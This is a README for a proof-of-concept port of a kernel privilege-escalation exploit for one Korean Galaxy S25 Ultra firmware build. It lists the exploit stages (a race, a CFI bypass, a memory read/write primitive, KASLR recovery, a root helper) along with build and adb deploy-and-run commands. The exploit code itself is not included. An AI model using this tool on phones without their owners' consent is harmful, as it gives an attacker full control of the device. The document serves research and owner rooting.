# CVE-2026-43499 PoC for Galaxy S25 Ultra

Device-specific proof of concept for CVE-2026-43499 on the Korean Samsung
Galaxy S25 Ultra.

## Supported target

```text
Model: SM-S938N
Codename: pa3q
Android: 16 / API 36
Build: S938NKSUACZF1
Display ID: BP4A.251205.006.S938NKSUACZF1
Fingerprint: samsung/pa3qksx/pa3q:16/BP4A.251205.006/S938NKSUACZF1_OKRACZF1:user/release-keys
Kernel: 6.6.98-android15-8-pd6ff1cd-abogkiS938NKSUACZF1-4k
Architecture: arm64 / 4K pages
```

The offsets and structure layouts are valid only for the firmware above.

## Reference

This port is based on:

- [NebuSec/CyberMeowfia — IonStack/CVE-2026-43499/exploit](https://github.com/NebuSec/CyberMeowfia/tree/b850d3bddc74c3328d5fbcc0568d21962b55d949/IonStack/CVE-2026-43499/exploit)
- Upstream revision: `b850d3bddc74c3328d5fbcc0568d21962b55d949`

The upstream Apache License 2.0 is retained in [LICENSE](LICENSE).

## Port changes

- Added the `pa3q-S938NKSUACZF1` offsets and kernel layouts.
- Added tracefs-based KASLR slide recovery for this Samsung kernel.
- Ported the pselect race, CFI/FOPS stage, and physical read/write primitive.
- Added the device-specific `system_unbound_wq` user-mode-helper root path.
- Added isolated retry processes with the device-tuned pselect delay sequence.
- Retains reclaimed pages after success to avoid recycling live forged objects.

## Build

Set `ANDROID_NDK_HOME` to Android NDK r29 or a compatible toolchain:

```sh
make -j8
```

Outputs:

```text
build/cve-2026-43499
build/cve-2026-43499-root
```

## Deploy and run

```sh
adb push build/cve-2026-43499 /data/local/tmp/cve-2026-43499
adb push build/cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb shell chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root
adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true"
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id'"
```

The exploit defaults to 16 independent attempts and a base pselect delay of
20,000 microseconds. Override them when collecting timing data:

```sh
adb shell "EXPLOIT_ATTEMPTS=24 PSELECT_DELAY_USEC=20000 LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true"
```

The temporary root session and retained allocations last until reboot.

For one-click installation and KernelSU support, use
[Root My Galaxy](https://github.com/BuSung-dev/Root-My-Galaxy).

Use only on devices you own or are explicitly authorized to test.
